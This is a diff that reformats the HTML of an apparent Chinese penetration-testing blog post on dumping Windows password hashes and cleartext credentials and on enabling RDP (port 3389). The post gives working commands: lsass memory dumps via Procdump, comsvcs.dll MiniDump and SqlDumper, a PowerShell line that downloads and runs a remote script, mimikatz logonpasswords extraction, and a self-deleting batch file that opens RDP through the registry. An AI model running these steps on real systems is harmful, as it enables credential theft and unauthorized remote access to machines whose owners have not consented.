@@ -1,164 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>导出 Windows 主机密码与开启 3389 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>导出 Windows 主机密码与开启 3389</h1>
-      
-<div class="post-meta">
-    <time>2016-08-08</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/intranet">intranet</a>)
-</div>
-
-      <div><h3 id="0x00-导出主机密码hash">0x00 导出主机密码hash</h3>
-<ul>
-<li>
-<p>关于Windows的hash</p>
-<ul>
-<li>早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash</li>
-<li>Windows hash由LM HASH和NT HASH两部分组成，形式为：用户名称:RID:LM-HASH值:NT-HASH值</li>
-<li>存储Windows hash的sam文件位置为：C:\windows\system32\config\SAM</li>
-</ul>
-</li>
-<li>
-<p>导出hash条件</p>
-<ul>
-<li>administrator以上权限</li>
-</ul>
-</li>
-<li>
-<p>导出hash工具</p>
-<ul>
-<li>wce</li>
-<li>gethash</li>
-<li>hashdump</li>
-<li>SAMInside</li>
-</ul>
-</li>
-<li>
-<p>上传工具得到hash
-<img src="/img/post/privilge_escalation_win_view_whoami.png" alt="查看是否为管理员以上权限">
-<img src="/img/post/privilge_escalation_win_upload_wce.png" alt="上传wce">
-<img src="/img/post/privilge_escalation_win_get_hash.png" alt="得到hash"></p>
-</li>
-<li>
-<p>在线网站解密hash</p>
-<ul>
-<li>LM Hash和NT Hash得到一个就可以解密，不过两个都得到的话解密的成功率会更高</li>
-<li>可以在<a href="http://www.objectif-securite.ch/ophcrack.php?_blank">http://www.objectif-securite.ch/ophcrack.php</a>解密
-<img src="/img/post/privilge_escalation_win_get_pwd.png" alt="解出密码"></li>
-</ul>
-</li>
-</ul>
-<h3 id="0x01-导出主机密码">0x01 导出主机密码</h3>
-<ul>
-<li>
-<p>条件</p>
-<ul>
-<li>administrator以上权限</li>
-<li>当前管理员没有注销登陆(可以通过query user命令看出)</li>
-</ul>
-</li>
-<li>
-<p>工具</p>
-<ul>
-<li>mimikatz</li>
-<li>getpass</li>
-</ul>
-</li>
-<li>
-<p>上传工具得到密码
-<img src="/img/post/privilge_escalation_win_view_whoami.png" alt="查看是否为管理员以上权限">
-<img src="/img/post/privilge_escalation_win_query_user.png" alt="查看管理员是否注销登陆">
-<img src="/img/post/privilge_escalation_win_upload_getpass.png" alt="上传getpass">
-<img src="/img/post/privilge_escalation_win_getpass1.png" alt="得到密码1">
-<img src="/img/post/privilge_escalation_win_getpass2.png" alt="得到密码2"></p>
-</li>
-<li>
-<p>导出NTLM Hash本地得到密码<br>
-若 mimikatz 和 getpass 这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密</p>
-<ul>
-<li>
-<p>导出文件 hash 文件</p>
-<ul>
-<li>上传 Procdump.exe 导出</li>
-</ul>
-<blockquote>
-<pre tabindex="0"><code></code></pre></blockquote>
-<p>Procdump.exe -accepteula -ma lsass.exe lsass.dmp</p>
-<pre tabindex="0"><code>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>导出 Windows 主机密码与开启 3389 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>导出 Windows 主机密码与开启 3389</h1><div class=post-meta><time>2016-08-08</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/intranet>intranet</a>)</div><div><h3 id=0x00-导出主机密码hash>0x00 导出主机密码hash</h3><ul><li><p>关于Windows的hash</p><ul><li>早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash</li><li>Windows hash由LM HASH和NT HASH两部分组成，形式为：用户名称:RID:LM-HASH值:NT-HASH值</li><li>存储Windows hash的sam文件位置为：C:\windows\system32\config\SAM</li></ul></li><li><p>导出hash条件</p><ul><li>administrator以上权限</li></ul></li><li><p>导出hash工具</p><ul><li>wce</li><li>gethash</li><li>hashdump</li><li>SAMInside</li></ul></li><li><p>上传工具得到hash
+<img src=/img/post/privilge_escalation_win_view_whoami.png alt=查看是否为管理员以上权限>
+<img src=/img/post/privilge_escalation_win_upload_wce.png alt=上传wce>
+<img src=/img/post/privilge_escalation_win_get_hash.png alt=得到hash></p></li><li><p>在线网站解密hash</p><ul><li>LM Hash和NT Hash得到一个就可以解密，不过两个都得到的话解密的成功率会更高</li><li>可以在<a href=http://www.objectif-securite.ch/ophcrack.php?_blank>http://www.objectif-securite.ch/ophcrack.php</a>解密
+<img src=/img/post/privilge_escalation_win_get_pwd.png alt=解出密码></li></ul></li></ul><h3 id=0x01-导出主机密码>0x01 导出主机密码</h3><ul><li><p>条件</p><ul><li>administrator以上权限</li><li>当前管理员没有注销登陆(可以通过query user命令看出)</li></ul></li><li><p>工具</p><ul><li>mimikatz</li><li>getpass</li></ul></li><li><p>上传工具得到密码
+<img src=/img/post/privilge_escalation_win_view_whoami.png alt=查看是否为管理员以上权限>
+<img src=/img/post/privilge_escalation_win_query_user.png alt=查看管理员是否注销登陆>
+<img src=/img/post/privilge_escalation_win_upload_getpass.png alt=上传getpass>
+<img src=/img/post/privilge_escalation_win_getpass1.png alt=得到密码1>
+<img src=/img/post/privilge_escalation_win_getpass2.png alt=得到密码2></p></li><li><p>导出NTLM Hash本地得到密码<br>若 mimikatz 和 getpass 这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密</p><ul><li><p>导出文件 hash 文件</p><ul><li>上传 Procdump.exe 导出</li></ul><blockquote><pre tabindex=0><code></code></pre></blockquote><p>Procdump.exe -accepteula -ma lsass.exe lsass.dmp</p><pre tabindex=0><code>
 * 或者执行 PowerShell 导出
 
 &gt; ```
@@ -167,35 +28,11 @@ powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.github
 或者
 tasklist /svc |findstr lsass.exe #查看 lsass.exe 的 pid
 powershell -c &#34;rundll32 C:\windows\system32\comsvcs.dll, MiniDump &lt;pid&gt; C:\lsass.dmp full&#34;
-</code></pre><ul>
-<li>或者用 SqlDumper.exe 导出</li>
-</ul>
-<blockquote>
-<pre tabindex="0"><code></code></pre></blockquote>
-<p>tasklist /svc |findstr lsass.exe #查看 lsass.exe 的 pid
-&ldquo;C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe&rdquo; <pid> 0 0x01100</p>
-<pre tabindex="0"><code></code></pre></li>
-<li>
-<p>下载导出的dmp文件后用本地mimikatz解密<br>
-先输入：<code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot;</code><br>
-后输入：sekurlsa::logonpasswords</p>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="0x02-开启3389">0x02 开启3389</h3>
-<ul>
-<li>
-<p>直接使用注册表
-<img src="/img/post/privilge_escalation_win_new_file_3389_reg.png" alt="新建开3389的注册表">
-<img src="/img/post/privilge_escalation_win_open_3389.png" alt="开3389端口">
-<img src="/img/post/privilge_escalation_win_open_3389_success.png" alt="成功开启3389端口"></p>
-</li>
-<li>
-<p>写一个批处理也行</p>
-</li>
-</ul>
-<pre tabindex="0"><code># 3389.bat内容如下：
+</code></pre><ul><li>或者用 SqlDumper.exe 导出</li></ul><blockquote><pre tabindex=0><code></code></pre></blockquote><p>tasklist /svc |findstr lsass.exe #查看 lsass.exe 的 pid
+&ldquo;C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe&rdquo; <pid>0 0x01100</p><pre tabindex=0><code></code></pre></li><li><p>下载导出的dmp文件后用本地mimikatz解密<br>先输入：<code>mimikatz.exe "sekurlsa::minidump lsass.dmp"</code><br>后输入：sekurlsa::logonpasswords</p></li></ul></li></ul><h3 id=0x02-开启3389>0x02 开启3389</h3><ul><li><p>直接使用注册表
+<img src=/img/post/privilge_escalation_win_new_file_3389_reg.png alt=新建开3389的注册表>
+<img src=/img/post/privilge_escalation_win_open_3389.png alt=开3389端口>
+<img src=/img/post/privilge_escalation_win_open_3389_success.png alt=成功开启3389端口></p></li><li><p>写一个批处理也行</p></li></ul><pre tabindex=0><code># 3389.bat内容如下：
 echo Windows Registry Editor Version 5.00&gt;&gt;3389.reg 
 echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg 
 echo &#34;fDenyTSConnections&#34;=dword:00000000&gt;&gt;3389.reg 
@@ -206,38 +43,12 @@ echo &#34;PortNumber&#34;=dword:00000d3d&gt;&gt;3389.reg
 regedit /s 3389.reg 
 del 3389.reg
 del 3389.bat
-</code></pre><p><img src="/img/post/privilge_escalation_win_new_file_3389_bat.png" alt="新建开3389的注册表"></p>
-<h4 id="reference侵删">Reference(侵删)：</h4>
-<p><a href="https://www.cnblogs.com/hiccup/p/4380298.html?_blank">https://www.cnblogs.com/hiccup/p/4380298.html</a></p>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><p><img src=/img/post/privilge_escalation_win_new_file_3389_bat.png alt=新建开3389的注册表></p><h4 id=reference侵删>Reference(侵删)：</h4><p><a href=https://www.cnblogs.com/hiccup/p/4380298.html?_blank>https://www.cnblogs.com/hiccup/p/4380298.html</a></p></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
